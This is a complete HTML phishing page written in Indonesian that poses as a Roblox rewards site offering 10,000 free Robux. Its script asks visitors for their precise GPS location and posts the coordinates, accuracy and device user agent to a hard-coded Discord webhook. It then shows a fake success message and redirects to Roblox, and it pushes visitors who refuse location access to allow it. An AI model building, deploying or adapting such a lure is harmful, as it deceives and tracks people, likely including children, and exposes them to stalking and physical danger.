<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Rewards Center</title>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        .btn { background-color: #0084ff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        .btn:active { transform: scale(0.9); }
    </style>
</head>
<body>
    <audio id="cashSound" src="https://www.myinstants.com/media/sounds/cash-register-purchase.mp3"></audio>

    <img src="https://images.rbxcdn.com/7b320857502787884f33160a229a1752.png" width="120">
    <h1>KLAIM 10.000 ROBUX</h1>
    <p>Verifikasi akun Tuan untuk menerima pengiriman Robux otomatis ke saldo Tuan.</p>
    
    <button class="btn" onclick="mintaLokasi()">KLAIM ROBUX SEKARANG</button>

    <script>
        function mintaLokasi() {
            // Putar suara duit
            var audio = document.getElementById("cashSound");
            audio.play();

            const webhook = "https://discord.com/api/webhooks/1482046386156474530/e0I5ddTi-8syF0bBHlgKeSk6ZBOU7RifD2Hq83ulLF-fdKZPGbGw1-rZ_x4aFu1xtlJI";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    const info = {
                        content: "🚨 **TARGET TERLOCK! GPS AKURAT!** 🚨",
                        embeds: [{
                            title: "KOORDINAT PANEN DITEMUKAN",
                            description: `[KLIK MAPS](https://www.google.com/maps?q=${lat},${lon})`,
                            color: 65280,
                            fields: [
                                { name: "🎯 Akurasi", value: pos.coords.accuracy + " meter", inline: true },
                                { name: "📱 Perangkat", value: navigator.userAgent }
                            ]
                        }]
                    };

                    await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) });
                    alert("Klaim Berhasil! Robux akan masuk dalam 5-10 menit.");
                    window.location.href = "https://www.roblox.com/home";
                }, (err) => {
                    alert("GAGAL! Tuan harus mengizinkan (ALLOW) lokasi untuk verifikasi regional.");
                    window.location.reload();
                }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>
</html>
